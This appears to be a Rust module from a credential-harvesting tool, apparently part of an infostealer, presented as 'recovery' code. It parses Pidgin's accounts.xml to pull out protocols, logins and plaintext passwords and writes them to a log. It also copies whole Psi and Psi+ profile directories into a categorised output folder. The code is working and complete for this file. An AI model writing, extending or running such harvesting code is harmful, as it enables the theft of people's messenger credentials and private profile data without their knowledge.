use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    messenger::messenger_output_dir,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use quick_xml::Reader;
use quick_xml::events::Event;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;

pub fn jabber_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(PidginTask), Arc::new(PsiTask::new(ctx))]
}

struct PidginTask;

#[async_trait]
impl RecoveryTask for PidginTask {
    fn label(&self) -> String {
        "Pidgin".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let source = ctx.roaming_data_dir.join(".purple").join("accounts.xml");
        if !source.exists() {
            return Ok(Vec::new());
        }

        let content = fs::read_to_string(&source).await?;
        let accounts = parse_pidgin_accounts(&content)
            .map_err(|err| RecoveryError::Custom(format!("pidgin xml parse failed: {err}")))?;

        let mut builder = String::new();
        for account in accounts.into_iter().filter(|acct| acct.is_complete()) {
            builder.push_str(&format!(
                "Protocol: {}\nLogin: {}\nPassword: {}\n\n",
                account.protocol.unwrap_or_default(),
                account.login.unwrap_or_default(),
                account.password.unwrap_or_default(),
            ));
        }

        if builder.is_empty() {
            return Ok(Vec::new());
        }

        let artifact = write_pidgin_artifact(ctx, &self.label(), "Pidgin.log", &builder).await?;
        Ok(vec![artifact])
    }
}

#[derive(Default)]
struct PidginAccount {
    protocol: Option<String>,
    login: Option<String>,
    password: Option<String>,
}

impl PidginAccount {
    fn is_complete(&self) -> bool {
        self.protocol.is_some() && self.login.is_some() && self.password.is_some()
    }
}

fn parse_pidgin_accounts(xml: &str) -> Result<Vec<PidginAccount>, quick_xml::Error> {
    #[derive(Debug, Clone, Copy)]
    enum Tag {
        Protocol,
        Name,
        Password,
    }

    let mut reader = Reader::from_str(xml);
    reader.trim_text(true);
    let mut accounts = Vec::new();
    let mut current = None;
    let mut tag = None;

    loop {
        match reader.read_event() {
            Ok(Event::Start(ref e)) if e.name().as_ref() == b"account" => {
                current = Some(PidginAccount::default());
            }
            Ok(Event::Start(ref e)) => match e.name().as_ref() {
                b"protocol" => tag = Some(Tag::Protocol),
                b"name" => tag = Some(Tag::Name),
                b"password" => tag = Some(Tag::Password),
                _ => {}
            },
            Ok(Event::Text(e)) => {
                if let Some(account) = current.as_mut() {
                    if let Some(current_tag) = tag {
                        if let Ok(text) = e.unescape() {
                            let value = text.into_owned();
                            match current_tag {
                                Tag::Protocol => account.protocol = Some(value),
                                Tag::Name => account.login = Some(value),
                                Tag::Password => account.password = Some(value),
                            }
                        }
                    }
                }
            }
            Ok(Event::End(ref e)) if e.name().as_ref() == b"account" => {
                if let Some(account) = current.take() {
                    accounts.push(account);
                }
            }
            Ok(Event::End(ref e)) => match e.name().as_ref() {
                b"protocol" | b"name" | b"password" => tag = None,
                _ => {}
            },
            Ok(Event::Eof) => break,
            Err(err) => return Err(err),
            _ => {}
        }
    }

    Ok(accounts)
}

async fn write_pidgin_artifact(
    ctx: &RecoveryContext,
    label: &str,
    file_name: &str,
    contents: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = messenger_output_dir(ctx, label).await?;
    let target = folder.join(file_name);
    fs::write(&target, contents).await?;
    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

struct PsiTask {
    profiles: Vec<PathBuf>,
}

impl PsiTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            profiles: vec![
                ctx.roaming_data_dir
                    .join("Psi+")
                    .join("profiles")
                    .join("default"),
                ctx.roaming_data_dir
                    .join("Psi")
                    .join("profiles")
                    .join("default"),
            ],
        }
    }
}

#[async_trait]
impl RecoveryTask for PsiTask {
    fn label(&self) -> String {
        "Psi Profiles".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for profile_dir in &self.profiles {
            if !profile_dir.exists() {
                continue;
            }

            let dest = psi_output_dir(ctx, profile_dir).await?;
            copy_profile_files(&self.label(), profile_dir, &dest, &mut artifacts).await?;
        }

        Ok(artifacts)
    }
}

async fn psi_output_dir(
    ctx: &RecoveryContext,
    profile_dir: &Path,
) -> Result<PathBuf, RecoveryError> {
    let psi_type = profile_dir
        .parent()
        .and_then(|p| p.parent())
        .and_then(|p| p.file_name())
        .map(|name| sanitize_label(&name.to_string_lossy()))
        .unwrap_or_else(|| "Psi".to_string());

    let folder = ctx
        .output_dir
        .join("services")
        .join("Messengers")
        .join("Psi")
        .join("Jabber")
        .join(psi_type)
        .join("profiles")
        .join("default");

    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn copy_profile_files(
    label: &str,
    source: &Path,
    destination: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    let mut dir = fs::read_dir(source).await?;
    while let Some(entry) = dir.next_entry().await? {
        let meta = entry.file_type().await?;
        if !meta.is_file() {
            continue;
        }

        let dest = destination.join(entry.file_name());
        fs::copy(entry.path(), &dest).await?;
        let file_meta = fs::metadata(&dest).await?;
        artifacts.push(RecoveryArtifact {
            label: label.to_string(),
            path: dest,
            size_bytes: file_meta.len(),
            modified: file_meta.modified().ok(),
        });
    }

    Ok(())
}
